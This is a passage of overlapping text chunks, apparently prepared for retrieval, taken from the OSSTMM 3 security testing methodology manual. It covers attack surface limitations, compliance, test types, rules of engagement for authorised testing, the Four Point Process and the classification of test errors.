in one of the limiting factors as described here. A justification for a limitation is a risk decision that is met with either a control of some kind or merely acceptance of the limitation. Risk decisions that accept the limitations as they are often come down to: the damage a limitation can cause does not justify the cost to fix or control the limitation, the limitation must remain according to legislation, contracts, or policy, or a conclusion that the threat does not exist or is unlikely for this particular limitation. Since risk justifications are not a part of calculating an attack surface, all limitations discovered must still be counted within the attack surface regardless if best practice, common practice, or legal practice denotes it as not a risk. If it is not then the audit",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 21
    }
  },
  {
    "text": "unlikely for this particular limitation. Since risk justifications are not a part of calculating an attack surface, all limitations discovered must still be counted within the attack surface regardless if best practice, common practice, or legal practice denotes it as not a risk. If it is not then the audit will not show a true representation of the operational security of the scope. Managing Limitations Another concept that must be taken into consideration is one of managing flaws and errors in an audit. The three most straightforward ways to manage limitations is to remove the problem area providing the interactive point altogether, fix them, or accept them as part of doing business known as the business justification. An audit will often uncover more than one problem per target. The Analyst is to report the limitations per target and not just which are the weak targets. These limitations may be in the protection measures and controls themselves, thus diminishing OpSec. Each limitation is to be rated as to what occurs when the problem is invoked, even if that invocation is theoretical or the verification is of limited execution to restrict actual damages. Theoretical categorization, where no verification could be made, is a slippery slope and should be limited to cases where verification would reduce the quality of operations. Then, when categorizing the problems, each limitation should be examined and calculated in specific terms of operation at its most basic components. However, the Analyst should be sure never to report a “flaw within a flaw” where the flaws share the same component and same operational effect. An example of this would be a door broken open with a broken window. The door opening is an Access even if the broken window is also but both are for the same component, the door way, and same operational effect, an opening. An example from Data Networks would be a computer system which sends a kernel reply, such as an ICMP “closed port” T03C03 packet for a particular port. This interaction is not counted for all such ports since the Access comes from the same component, the kernel, and has the same operational effect, sending a T03C03 packet per port queried. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 30\\n1.5 Actual Security The role of the Controls is to control the porosity in OpSec. It’s like having ten ways of controlling threats that come through a hole in a wall. For each hole, a maximum of ten different controls can be applied which bring security back up towards and sometimes above 100%. Limitations then reduce the effectiveness of OpSec and Controls. The result of an audit which discovers and shows the Security, Controls, and Limitations is effectively demonstrating Actual Security. Actual Security is a term for a snapshot of an attack surface in an operational environment. It is a logarithmic representation of the Controls, Limitations, and OpSec at a particular moment in time. It is logarithmic because it represents the reality of size where a",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 22
    }
  },
  {
    "text": "is effectively demonstrating Actual Security. Actual Security is a term for a snapshot of an attack surface in an operational environment. It is a logarithmic representation of the Controls, Limitations, and OpSec at a particular moment in time. It is logarithmic because it represents the reality of size where a larger scope will have a larger attack surface even if mathematically the Controls will balance the OpSec. Using this as building blocks to better understand how security works, the visualization that we create from this is the effective balance created between where an attack can occur, where the Controls are in place to manage an attack, and the limitations of the protective measures. Another benefit of mathematical representation of an attack surface as Actual Security is that besides just showing where protection measures are lacking it can also show the opposite. Since it is possible to have more controls than one needs this can be mathematically represented as more than 100% rav. Whether a risk assessment may make this point seem impossible, the mathematical representation is useful for showing waste. It can be used to prove when money is being overspent on the wrong types of controls or redundant controls. 1.6 Compliance Compliance is a different thing than security and exists separate from security. It is possible to be compliant yet not secure and it is possible to be relatively secure but non-compliant and therefore of low trustworthiness. Compliance projects are not the time to redefine operational security requirements as a result of an OSSTMM test, they may however be the time to specify the use of OSSTMM testing, on a periodic basis, to fulfill a control requirement drafted as a result of a trust assessment that has scoped the minimum number of controls required to achieve a compliant (but not necessarily secure) state. The big problem with compliance is it requires a lot of documentation that has to be versioned and updated. This documentation can be of business processes, narratives, trust assessments, risk assessments, signed off design tests, operational audits, attestations, and so on and on. This documentation is scrutinized by internal and external auditors and has to logically fulfill its existence in the world of a compliant state. Most recent compliance efforts have been driven by the short term requirements of imposed regulations with short term implementation requirements. This has created a lot of resource requirements and cost. Given time to think about it we try to build compliance and evidence production into a process and manage this resource requirement and cost. Compliance is a broad brush approach to the application of best practice from, as far as Information Technology is concerned, the likes of COBIT and ITIL; an OSSTMM test should provide documentation that provides an understandable, verifiable level of quality. The use of the OSSTMM, however, is designed to allow the Analyst to view and understand security and safety. Therefore, with the use of this methodology, any compliance is, at least, the production of evidence of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 23
    }
  },
  {
    "text": "an OSSTMM test should provide documentation that provides an understandable, verifiable level of quality. The use of the OSSTMM, however, is designed to allow the Analyst to view and understand security and safety. Therefore, with the use of this methodology, any compliance is, at least, the production of evidence of governance within the business process of security. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 31\\nFact does not come from the grand leaps of discovery but rather from the small, careful steps of verification. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 32\\nChapter 2 – What You Need to Do Where do you start? Testing is a complicated affair and with anything complicated, you approach it in small, comprehensible pieces to be sure you don’t make mistakes. Conventional wisdom says complexity is an enemy of security. However, it is only at odds with human nature. Anything which is made more complex is not inherently insecure. Consider a computer managing complex tasks. The problem as we know it is not that the computer will make mistakes, confuse the tasks, or forget to complete some. As more tasks are added to the computer, it gets slower and slower, taking more time to complete all the tasks. People, however, do make mistakes, forget tasks, and purposely abandon tasks which are either not important or required at the moment. So when testing security, what you need to do is properly manage any complexity. This is done by properly defining the security test. 2.1 Defining a Security Test These 7 steps will take you to the start of a properly defined security test. 1. Define what you want to protect. These are the assets. The protection mechanisms for these assets are the Controls you will test to identify Limitations. 2. Identify the area around the assets which includes the protection mechanisms and the processes or services built around the assets. This is where interaction with assets will take place. This is your engagement zone. 3. Define everything outside the engagement zone that you need to keep your assets operational. This may include things you may not be able to directly influence like electricity, food, water, air, stable ground, information, legislation, regulations and things you may be able to work with like dryness, warmth, coolness, clarity, contractors, colleagues, branding, partnerships, and so on. Also count that which keeps the infrastructure operational like processes, protocols, and continued resources. This is your test scope. 4. Define how your scope interacts within itself and with the outside. Logically compartmentalize the assets within the scope through the direction of interactions such as inside to outside, outside to inside, inside to inside, department A to department B, etc. These are your vectors. Each vector should ideally be a separate test to keep each compartmentalized test duration short before too much change can occur within the environment. 5. Identify what equipment will be needed for each test. Inside each vector, interactions may occur on various levels. These levels may be classified in",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 24
    }
  },
  {
    "text": "vectors. Each vector should ideally be a separate test to keep each compartmentalized test duration short before too much change can occur within the environment. 5. Identify what equipment will be needed for each test. Inside each vector, interactions may occur on various levels. These levels may be classified in many ways, however here they have been classified by function as five channels. The channels are Human, Physical, Wireless, Telecommunications, and Data Networks. Each channel must be separately tested for each vector. 6. Determine what information you want to learn from the test. Will you be testing interactions with the assets or also the response from active security measures? The test type must be individually defined for each test, however there are six common types identified here as Blind, Double Blind, Gray Box, Double Gray Box, Tandem, and Reversal. 7. Assure the security test you have defined is in compliance to the Rules of Engagement, a guideline to assure the process for a proper security test without creating misunderstandings, misconceptions, or false expectations. The end result will be a measurement of your Attack Surface. The attack surface is the unprotected part of the Scope from a defined Vector. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 33\\n2.2 Scope The scope is the total possible operating security environment for any interaction with any asset which may include the physical components of security measures as well. The scope is comprised of three classes of which there are five channels: Telecommunications and Data Networks security Channels of the COMSEC class, Physical and Human Security Channels of the PHYSSEC class, and the full spectrum Wireless Security Channel of the SPECSEC class. Classes are from official designations currently in use in the security industry, government, and the military. Classes are used to define an area of study, investigation, or operation. However, Channels are the specific means of interacting with assets. An asset can be anything that has value to the owner. Assets can be physical property like gold, people, blueprints, laptops, the typical 900 MHz frequency phone signal, and money; or intellectual property such as personnel data, a relationship, a brand, business processes, passwords, and something which is said over the 900 MHz phone signal. Often, the scope extends far beyond the reach of the asset owner as dependencies are beyond the asset owner’s ability to provide independently. The scope requires that all threats be considered possible, even if not probable. Although, it must be made clear that a security analysis must be restricted to that which is within a type of certainty (not to be confused with risk which is not a certainty but a probability). These restrictions include: 1. Non-events such as a volcano eruption where no volcano exists, 2. Non-impact like moonlight through data center window, or 3. Global-impacting such as a catastrophic meteor impact. While a thorough security audit requires testing all five channels, realistically, tests are conducted and categorized by the required expertise of the Analyst and the required equipment",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 25
    }
  },
  {
    "text": "volcano eruption where no volcano exists, 2. Non-impact like moonlight through data center window, or 3. Global-impacting such as a catastrophic meteor impact. While a thorough security audit requires testing all five channels, realistically, tests are conducted and categorized by the required expertise of the Analyst and the required equipment for the audit. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 34\\nChannels Class Channel Description Comprises the human element of communication Human where interaction is either physical or psychological. Physical security testing where the channel is both Physical Security physical and non-electronic in nature. Comprises the (PHYSSEC) tangible element of security where interaction Physical requires physical effort or an energy transmitter to manipulate. Comprises all electronic communications, signals, and emanations which take place over the known Spectrum Security EM spectrum. This includes ELSEC as electronic Wireless (SPECSEC) communications, SIGSEC as signals, and EMSEC which are emanations untethered by cables. Comprises all telecommunication networks, digital or analog, where interaction takes place over Telecommunications established telephone or telephone-like network lines. Communications Comprises all electronic systems and data networks Security (COMSEC) where interaction takes place over established cable Data Networks and wired network lines. Data Networks While the channels and their divisions may be represented in any way, within this manual they are organized as recognizable means of communication and interaction. This organization is designed to facilitate the test process while minimizing the inefficient overhead that is often associated with strict methodologies. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 35\\n2.3 Common Test Types These six types differ based on the amount of information the tester knows about the targets, what the target knows about the tester or expects from the test, and the legitimacy of the test. Some tests will test the tester’s skill more than actually testing the security of a target. Do note when reporting the audit, there is often a requirement to identify exactly the type of audit performed. Too often, audits based on different test types are compared to track the delta (deviations) from an established baseline of the scope. If the precise test type is not available to a third-party reviewer or regulator, the audit itself should be considered a Blind test, which is one with the least merit towards a thorough security test. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 36\\nType Description The Analyst engages the target with no prior knowledge of its defenses, assets, or channels. The target is prepared for the audit, knowing in advance all the details of the audit. A blind audit primarily tests the skills of the Analyst. The breadth and depth 1 Blind of a blind audit can only be as vast as the Analyst’s applicable knowledge and efficiency allows. In COMSEC and SPECSEC, this is often referred to as Ethical Hacking and in the PHYSSEC class, this is generally scripted as War Gaming or Role Playing. The Analyst engages the target with no prior knowledge of its defenses, assets, or channels. The target is not notified in advance",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 26
    }
  },
  {
    "text": "allows. In COMSEC and SPECSEC, this is often referred to as Ethical Hacking and in the PHYSSEC class, this is generally scripted as War Gaming or Role Playing. The Analyst engages the target with no prior knowledge of its defenses, assets, or channels. The target is not notified in advance of the scope of the audit, the channels tested, or the test vectors. A double blind audit tests the skills of the Analyst and the preparedness of the target to unknown variables of agitation. The breadth 2 Double Blind and depth of any blind audit can only be as vast as the Analyst’s applicable knowledge and efficiency allows. This is also known as a Black Box test or Penetration test. The Analyst engages the target with limited knowledge of its defenses and assets and full knowledge of channels. The target is prepared for the audit, knowing in advance all the details of the audit. A gray box audit tests the skills of the Analyst. The nature of the test is efficiency. The breadth and depth depends upon the quality of 3 Gray Box the information provided to the Analyst before the test as well as the Analyst’s applicable knowledge. This type of test is often referred to as a Vulnerability Test and is most often initiated by the target as a self-assessment. The Analyst engages the target with limited knowledge of its defenses and assets and full knowledge of channels. The target is notified in advance of the scope and time frame of the audit but not the channels tested or the test vectors. A double Double Gray gray box audit tests the skills of the Analyst and the target’s preparedness to 4 Box unknown variables of agitation. The breadth and depth depends upon the quality of the information provided to the Analyst and the target before the test as well as the Analyst’s applicable knowledge. This is also known as a White Box test. The Analyst and the target are prepared for the audit, both knowing in advance all the details of the audit. A tandem audit tests the protection and controls of the target. However, it cannot test the preparedness of the target to unknown variables of agitation. The true nature of the test is thoroughness as the Analyst does have full 5 Tandem view of all tests and their responses. The breadth and depth depends upon the quality of the information provided to the Analyst before the test (transparency) as well as the Analyst’s applicable knowledge. This is often known as an In-House Audit or a Crystal Box test and the Analyst is often part of the security process. The Analyst engages the target with full knowledge of its processes and operational security, but the target knows nothing of what, how, or when the Analyst will be testing. The true nature of this test is to audit the preparedness of the target to 6 Reversal unknown variables and vectors of agitation. The breadth and depth depends upon",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 27
    }
  },
  {
    "text": "of its processes and operational security, but the target knows nothing of what, how, or when the Analyst will be testing. The true nature of this test is to audit the preparedness of the target to 6 Reversal unknown variables and vectors of agitation. The breadth and depth depends upon the quality of the information provided to the Analyst and the Analyst’s applicable knowledge and creativity. This is also often called a Red Team exercise. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 37\\n2.4 Rules Of Engagement These rules define the operational guidelines of acceptable practices in marketing and selling testing, performing testing work, and handling the results of testing engagements. A. Sales and Marketing 1. The use of fear, uncertainty, doubt, and deception may not be used in the sales or marketing presentations, websites, supporting materials, reports, or discussion of security testing for the purpose of selling or providing security tests. This includes but is not limited to highlighting crimes, facts, glorified criminal or hacker profiles, and statistics to motivate sales. 2. The offering of free services for failure to penetrate the target is forbidden. 3. Public cracking, hacking, and trespass contests to promote security assurance for sales or marketing of security testing or security products are forbidden. 4. To name past or present clients in the marketing or sales for potential customers is only allowed if the work for the client was specifically the same as being marketed or sold and the named client has provided written permission to do so. 5. It is required that clients are advised truthfully and factually in regards to their security and security measures. Ignorance is not an excuse for dishonest consultancy. B. Assessment / Estimate Delivery 6. Performing security tests against any scope without explicit written permission from the target owner or appropriate authority is strictly forbidden. 7. The security testing of obviously highly insecure and unstable systems, locations, and processes is forbidden until the proper security infrastructure has been put in place. C. Contracts and Negotiations 8. With or without a Non-Disclosure Agreement contract, the security Analyst is required to provide confidentiality and non-disclosure of customer information and test results. 9. Contracts should limit liability to the cost of the job, unless malicious activity has been proven. 10. Contracts must clearly explain the limits and dangers of the security test as part of the statement of work. 11. In the case of remote testing, the contract must include the origin of the Analysts by address, telephone number or IP address. 12. The client must provide a signed statement which provides testing permission exempting the Analysts from trespass within the scope, and damages liability to the cost of the audit service with the exception where malicious activity has been proven. 13. Contracts must contain emergency contact names and phone numbers. 14. The contract must include clear, specific permissions for tests involving survivability failures, denial of service, process testing, and social engineering. 15. Contracts must contain the process for future contract and",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 28
    }
  },
  {
    "text": "with the exception where malicious activity has been proven. 13. Contracts must contain emergency contact names and phone numbers. 14. The contract must include clear, specific permissions for tests involving survivability failures, denial of service, process testing, and social engineering. 15. Contracts must contain the process for future contract and statement of work (SOW) changes. 16. Contracts must contain verified conflicts of interest for a factual security test and report. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 38\\nD. Scope Definition 17. The scope must be clearly defined contractually before verifying vulnerable services. 18. The audit must clearly explain the limits of any security tests according to the scope. E. Test Plan 19. The test plan may not contain plans, processes, techniques, or procedures which are outside the area of expertise or competence level of the Analyst. F. Test Process 20. The Analyst must respect and maintain the safety, health, welfare, and privacy of the public both within and outside the scope. 21. The Analyst must always operate within the law of the physical location(s) of the targets in addition to rules or laws governing the Analyst’s test location. 22. To prevent temporary raises in security for the duration of the test, only notify key people about the testing. It is the client’s judgment which discerns who the key people are; however, it is assumed that they will be information and policy gatekeepers, managers of security processes, incident response personnel, and security operations staff. 23. If necessary for privileged testing, the client must provide two, separate, access tokens whether they be passwords, certificates, secure ID numbers, badges, etc. and they should be typical to the users of the privileges being tested rather than especially empty or secure accesses. 24. When testing includes known privileges, the Analyst must first test without privileges (such as in a black box environment) prior to testing again with privileges. 25. The Analysts are required to know their tools, where the tools came from, how the tools work, and have them tested in a restricted test area before using the tools on the client organization. 26. The conduct of tests which are explicitly meant to test the denial of a service or process or survivability may only be done with explicit permission and only to the scope where no damage is done outside of the scope or the community in which the scope resides. 27. Tests involving people may only be performed on those identified in the scope and may not include private persons, customers, partners, associates, or other external entities without written permission from those entities. 28. Verified limitations, such as discovered breaches, vulnerabilities with known or high exploitation rates, vulnerabilities which are exploitable for full, unmonitored or untraceable access, or which may immediately endanger lives, discovered during testing must be reported to the customer with a practical solution as soon as they are found. 29. Any form of flood testing where a scope is overwhelmed from a larger and stronger source is forbidden over",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 29
    }
  },
  {
    "text": "full, unmonitored or untraceable access, or which may immediately endanger lives, discovered during testing must be reported to the customer with a practical solution as soon as they are found. 29. Any form of flood testing where a scope is overwhelmed from a larger and stronger source is forbidden over non-privately owned channels. 30. The Analyst may not leave the scope in a position of less actual security than it was when provided. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 39\\nG. Reporting 31. The Analyst must respect the privacy of all individuals and maintain their privacy for all results. 32. Results involving people untrained in security or non-security personnel may only be reported via non-identifying or statistical means. 33. The Analyst may not sign test results and audit reports in which they were not directly involved. 34. Reports must remain objective and without untruths or any personally directed malice. 35. Client notifications are required whenever the Analyst changes the testing plan, changes the source test venue, has low trust findings, or any testing problems have occurred. Notifications must be provided previous to running new, dangerous, or high traffic tests, and regular progress updates are required. 36. Where solutions and recommendations are included in the report, they must be valid and practical. 37. Reports must clearly mark all unknowns and anomalies. 38. Reports must clearly state both discovered successful and failed security measures and loss controls. 39. Reports must use only quantitative metrics for measuring security. These metrics must be based on facts and void of subjective interpretations. 40. The client must be notified when the report is being sent as to expect its arrival and to confirm receipt of delivery. 41. All communication channels for delivery of the report must be end to end confidential. 42. Results and reports may never be used for commercial gain beyond that of the interaction with the client. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 40\\n2.5 The Operational Security Testing Process Why test operations? Unfortunately, not everything works as configured. Not everyone behaves as trained. Therefore the truth of configuration and training is in the resulting operations. That’s why we need to test operations. The OpSec testing process is a discrete event test of a dynamic, stochastic system. This means that you will be making a chronological sequence of tests on a system that changes and does not always give the same output for the input provided. The target is a system, a collection of interacting and co-dependent processes which is also influenced by the stochastic environment it exists in. Being stochastic means the behavior of events in a system cannot be determined because the next environmental state can only be partially but not fully determined by the previous state. The system contains a finite but possibly extremely large number of variables and each change in variables may present an event and a change in state. Since the environment is stochastic, there is an element of randomness and there is no means",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 30
    }
  },
  {
    "text": "but not fully determined by the previous state. The system contains a finite but possibly extremely large number of variables and each change in variables may present an event and a change in state. Since the environment is stochastic, there is an element of randomness and there is no means for predetermining with certainty how all the variables will affect the system state. Most of what people understand of OpSec comes from the defensive aspect which is understandable since security is generally considered a defensive strategy. Aggressive testing of OpSec is then relegated to the same class as the exploitation and circumvention of the current design or configuration. However, the fundamental problem with this technique is that a design or configuration does not equate to operation. We encounter many instances in life where operation does not conform to configuration. A simple example is a typical job description. It is more common than not that the policy which dictates one’s job, also known as a job description, falls short from actually reflecting what we do on the job. Another example is the TV channel. Because a channel is set to a particular frequency (configured) it does not mean we will receive the show broadcast on that channel or only that show. This security testing methodology is designed on the principle of verifying the security of operations. While it may not always test processes and policy directly, a successful test of operations will allow for analysis of both direct and indirect data to study the gap between operations and processes. This will show the size of the rift between what management expects of operations from the processes they developed and what is really happening. More simply put, the Analyst’s goal is to answer: “how do current operations work and how do they work differently from how management thinks they work?” A point of note is the extensive research available on change control for processes to limit the amount of indeterminable events in a stochastic system. The Analyst will often attempt to exceed the constraints of change control and present “what if” scenarios which the change control implementers may not have considered. A thorough understanding of change control is essential for any Analyst. An operational security test therefore requires thorough understanding of the testing process, choosing the correct type of test, recognizing the test channels and vectors, defining the scope according to the correct index, and applying the methodology properly. Strangely, nowhere, besides in security testing is the echo process considered the defacto test. Like yelling into a cavernous area and awaiting the response, the echo process requires interacting and then monitoring emanations from the target for indicators of a particular state such as secure or insecure, vulnerable or protected, on or off, and left or right. The echo process is of a cause and effect type of verification. The Analyst makes the cause and analyzes the effect on the target. It is strange that this is the primary means of testing something",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 31
    }
  },
  {
    "text": "as secure or insecure, vulnerable or protected, on or off, and left or right. The echo process is of a cause and effect type of verification. The Analyst makes the cause and analyzes the effect on the target. It is strange that this is the primary means of testing something as critical as security because although it makes for a very fast test, it is also highly prone to errors, some of which may be devastating to the target. Consider that in a security test using the echo process, a target that does not respond is considered secure. Following that logic, a Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 41\\ntarget needs only to be non-responsive to a particular type of request to give the appearance of security however still be fully interactive with other types of requests which shows there has been no separation. If hospitals used the echo process to determine the health of an individual, it would rarely help people, but at least the waiting room time would be very short. Hospitals however, like most other scientific industries, apply the Four Point Process which includes a function of the echo process called the “interaction” as one of the four tests. The other three tests are: the “inquest” of reading emanations from the patient such as pulse, blood pressure, and brain waves; the “intervention” of changing and stressing operating conditions such as the patient’s homeostasis, behavior, routine, or comfort level; and the “induction” of examining the environment and how it may have affected the target such analyzing what the patient has interacted with, touched, eaten, drank, or breathed in. However, in security testing, the majority of tests are based on the echo process alone. There is so much information lost in such one- dimensional testing we should be thankful that the health care industry has evolved past just the “Does it hurt if I do this?” manner of diagnosis. The security test process in this methodology does not recommend the echo process alone for reliable results. While the echo process may be used for certain, particular tests where the error margin is small and the increased efficiency allows for time to be moved to other time-intensive techniques, it is not recommended for tests outside of a deterministic environment. The Analyst must choose carefully when and under what conditions to apply the echo process. While many testing processes exist, the Four Point Process for security testing is designed for optimum efficiency, accuracy, and thoroughness to assure test validity and minimize errors in uncontrolled and stochastic environments. It is optimized for real-world test scenarios outside of the lab. While it also uses agitation, it differs from the echo process in that it allows for determining more than one cause per effect and more than one effect per cause. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 42\\n2.6 Four Point Process The Four Point Process (4PP) breaks down a test from start to conclusion. These are things that an experienced testing",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 32
    }
  },
  {
    "text": "that it allows for determining more than one cause per effect and more than one effect per cause. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 42\\n2.6 Four Point Process The Four Point Process (4PP) breaks down a test from start to conclusion. These are things that an experienced testing group already does. Don’t confuse the formality in the dissection of the process with the formality of the reporting. You don’t have to show every step being done but you should understand how you got from A to C. It is like giving people driving directions. You tell them the steps on where they turn and relative proximity to things that they will see to know they are going the right way but you don’t tell them every street they drive down and every traffic signal they must obey to get to the end. Well, the 4PP is the specific directions and the means and reporting are actually the relativistic ones. Interactions within the 4 Point Process 1. Induction: (Z) establishing principle truths about the target from environmental laws and facts. The Analyst determines factual principles regarding the target from the environment where the target resides. As the target will be influenced by its environment, its behavior will be determinable within this influence. Where the target is not influenced by its environment, there exists an anomaly to be understood. 2. Inquest: (C) investigating target emanations. The Analyst investigates the emanations from the target and any tracks or indicators of those emanations. A system or process will generally leave a signature of its existence through interactions with its environment. 3. Interaction: (A/B) like echo tests, standard and non-standard interactions with the target to trigger responses. The Analyst will inquire or agitate the target to trigger responses for analysis. 4. Intervention: (X/Y/Z) changing resource interactions with the target or between targets. The Analyst will intervene with the resources the target requires from its environment or from its interactions with other targets to understand the extremes under which it can continue operating adequately. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 43\\n2.7 The Trifecta This security testing methodology has a solid base which may seem quite involved, but it is actually simple in practice. It is designed as a flowchart; however, unlike the standard flowchart, the flow, represented by the arrows, may go backward as well as forward. In this way, it is more integrated and while the beginning and the end are clear, the audit has greater flexibility. The Analyst creates a unique path through the methodology based on the target, the type of test, the time allotted for the audit, and the resources applied to the test. For an orchestra, the composer writes the sheet music to designate the order and duration of notes, but only the conductor can control the execution of the performance. This methodology is like the sheet music, designating the necessary tests, but the Analyst controls the order, the duration, as well as the execution. The main",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 33
    }
  },
  {
    "text": "composer writes the sheet music to designate the order and duration of notes, but only the conductor can control the execution of the performance. This methodology is like the sheet music, designating the necessary tests, but the Analyst controls the order, the duration, as well as the execution. The main reason for requiring this level of flexibility in the OSSTMM is because no methodology can accurately presume the justifications for the operations of channel gateways in a target and their adequate level of security. More directly, this methodology cannot presume a best practice for conducting all audits, as best practice is based on a specific configuration of operations. Best practice is only best for some; generally the originator of the practice. Operations dictate how services should be offered, and those services dictate the requirements for operational security. Therefore, a methodology that is invoked differently for each audit and by each Analyst can still have the same end result if the Analyst completes the methodology. For this reason one of the foundations of the OSSTMM is to record precisely what was not tested. By comparing what was tested and the depth of the testing with other tests, it is possible to measure operational security (OpSec) based on the test results. Applying this methodology will therefore meet the Analyst’s goal to answer the following three questions which make up the Trifecta, the answer to OpSec needs. 1. How do current operations work? The derived metrics can be applied to determine the problem areas within the scope and which problems must be addressed. The metrics in this methodology are designed to map the problems in different ways so as to show if the problem is a general one or more specific, like an overlook or a mistake. 2. How do they work differently from how management thinks they work? Access to policies or a trust (or even a risk) assessment will map back to the different categories of the metrics. The categories provide the current state values where a comparison can be made with both an optimum state according to the policies and one according to assessed threats. 3. How do they need to work? Where the metrics show no gap between policy or trust (or risk) assessment’s optimum values yet the security test shows that there is indeed a protection problem regardless of controls as implemented in policy, it is possible to clearly denote a problem. Often, without even mapping to policy, a discrepancy between the implemented controls and the loss of protection is simply evident. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 44\\nCombining the Trifecta and the 4 Point Process The Trifecta combined with the Four Point Process provide a substantially thorough application of this methodology. The steps in this application can be summarized as follows: 1. Passively collect data of normal operations to comprehend the target. 2. Actively test operations by agitating operations beyond the normal baseline. 3. Analyze data received directly from the operations tested. 4. Analyze indirect",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 34
    }
  },
  {
    "text": "substantially thorough application of this methodology. The steps in this application can be summarized as follows: 1. Passively collect data of normal operations to comprehend the target. 2. Actively test operations by agitating operations beyond the normal baseline. 3. Analyze data received directly from the operations tested. 4. Analyze indirect data from resources and operators (i.e. workers, programs). 5. Correlate and reconcile intelligence from direct (step 3) and indirect (step 4) data test results to determine operational security processes. 6. Determine and reconcile errors. 7. Derive metrics from both normal and agitated operations. 8. Correlate and reconcile intelligence between normal and agitated (steps 1 and 2) operations to determine the optimal level of protection and control which would best be implemented. 9. Map the optimal state of operations (step 8) to processes (step 5). 10. Create a gap analysis to determine what enhancements are needed for processes governing necessary protection and controls (step 5) to achieve the optimal operational state (step 8) from the current one. Combining the Trifecta and the 4 Point Process Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 45\\n2.8 Error Handling The veracity in a security test is not in the sum of its errors, but rather in the accounting for its errors. Since errors may not be the fault of the Analyst, the understanding of how and where errors can exist within a test is much more reasonable than expecting an Analyst to test without error. Furthermore, it is the Analyst who attempts what should not be possible that is most likely to encounter errors; therefore, denoting errors as a negative thing discounts the practice of thorough testing. Error Type Description Something determined as true is actually revealed false. The target response indicates a particular state as true although in reality 1 False Positive the state is not true. A false positive often occurs when the Analyst’s expectations or assumptions of what indicates a particular state do not hold to real-world conditions which are rarely black and white. Something determined as false is actually revealed as true. The target response indicates a particular state as not true although in reality the state is true. A false negative often occurs when the Analyst’s 2 False Negative expectations or assumptions about the target do not hold to real-world conditions, the tools are not adequate for the test, the tools are misused, or the Analyst lacks experience. A false negative can be dangerous as it is a misdiagnosis of a secure state when it does not exist. Something answers true to everything even if false. The target response indicates a particular state as true, however the target 3 Gray Positive is designed to respond to any cause with this state whether it is true or not. This type of security through obscurity may be dangerous, as the illusion cannot be guaranteed to work the same for all stimuli. Something answers false to everything even if true. The target response indicates a particular state as not true, however the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 35
    }
  },
  {
    "text": "this state whether it is true or not. This type of security through obscurity may be dangerous, as the illusion cannot be guaranteed to work the same for all stimuli. Something answers false to everything even if true. The target response indicates a particular state as not true, however the 4 Gray Negative target is designed to respond to any cause with this state whether it is true or not. This type of security through obscurity may be dangerous, as the illusion cannot be guaranteed to work the same for all stimuli. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 46\\nError Type Description Something answers either true or false but the real state is revealed as unknown. The target response indicates a particular state as either true or false although in reality the state cannot be known. A specter often occurs when the Analyst receives a response from an external stimulus that is perceived to be from the target. A specter may be intentional, an 5 Specter anomaly from within the channel, or the result of carelessness or inexperience from the Analyst. One of the most common problems in the echo process is the assumption that the response is a result of the test. Cause and effect testing in the real world cannot achieve consistently reliable results since neither the cause nor the effect can be properly isolated. Something answers either true or false depending when it’s asked. The target response indicates a particular state as either true or false but only during a particular time, which may or may not follow a pattern. If the response cannot be verified at a time when the state changes, it may prevent the Analyst from comprehending the other state. An Analyst may 6 Indiscretion also determine that this is an anomaly or a problem with testing equipment, especially if the Analyst failed to calibrate the equipment prior to the test or perform appropriate logistics and controls. An indiscretion can be dangerous as it may lead to a false reporting of the state of security. The answer is lost or confused in signal noise. The target response cannot accurately indicate a particular state as either true or false due to a high noise to signal ratio. Akin to the idea of losing a flashlight beam in the sunlight, the Analyst cannot properly determine state 7 Entropy Error until the noise is reduced. This type of environmentally caused error rarely exists in a lab, however it is a normal occurrence in an uncontrolled environment. Entropy can be dangerous, if its effects 